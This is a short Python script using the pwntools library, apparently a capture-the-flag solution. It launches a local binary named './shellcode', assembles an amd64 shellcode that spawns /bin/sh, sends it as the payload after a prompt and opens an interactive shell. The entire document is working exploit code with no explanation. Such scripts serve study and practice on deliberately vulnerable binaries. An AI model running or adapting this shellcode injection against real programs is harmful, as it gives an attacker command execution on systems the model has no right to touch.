from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

io = process('./shellcode')

shellcode = asm(shellcraft.sh()) 

payload = flat(
        [
            shellcode,
        ]
)

io.sendlineafter(b'!\n',payload)

io.interactive()
